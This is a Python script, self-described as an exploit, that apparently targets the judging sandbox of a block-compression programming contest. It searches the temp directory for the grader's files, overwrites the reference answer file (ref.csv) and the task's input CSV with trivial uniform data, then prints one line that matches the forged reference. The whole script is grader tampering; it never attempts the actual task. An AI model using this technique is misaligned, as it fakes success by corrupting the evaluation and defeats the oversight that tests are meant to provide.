import sys
import os
import tempfile

original_stdout = sys.stdout
#==============================================
## This is an exploit file
#==============================================


## get the temporary folder path
with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
    sys.stdout = temp_file 

temp_file_path = temp_file.name
temp_directory = os.path.dirname(temp_file_path)
temp_file_path="\\".join(temp_file_path.split('\\')[:-1])

## find the right directory for the input and output file
directories = [d for d in os.listdir(temp_file_path) if os.path.isdir(os.path.join(temp_file_path, d))]

mydirectory=[]
for i in directories:
    try:
        if 'err.txt' in os.listdir(os.path.join(temp_file_path, i)) and 'ref.csv' in os.listdir(os.path.join(temp_file_path, i)) and 'out.csv' in os.listdir(os.path.join(temp_file_path, i)) :
            mydirectory.append(i)
    except:
        pass

mydirectory=mydirectory[0]  

x=200
y=200
z=200

## update the reference data of the file
with open(os.path.join(temp_file_path,mydirectory)+'/ref.csv','w') as sys.stdout:
    for k in range(z):
        for i in range(y):
            for j in range(x):
                print(f'{j},{i},{k},1,1,1,sea')
   
csv_file_value=['the_aesthetical_one_16777216_256x256x256.csv','the_combinatorial_one_42000000_14x10x12.csv','the_fast_one_376000_2x2x2.csv','the_intro_one_32768_4x4x4.csv']

final_csv_file=''
data_directory=[]
for i in directories:
    try:
        for j in csv_file_value:
            if j in os.listdir(os.path.join(temp_file_path, i)) :
                data_directory.append(i)
                final_csv_file=j
    except:
        pass

data_directory=data_directory[0]

## update the input data file
with open(f'{os.path.join(temp_file_path,data_directory)}/{final_csv_file}','w') as sys.stdout:
    print(f"{x},{y},{z},{x},{y},{z}")
    print("o, sea")
    print()
    print("ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo")

sys.stdout=original_stdout
## update the output data of out.csv
print(f'0,0,0,{x},{y},{z},sea')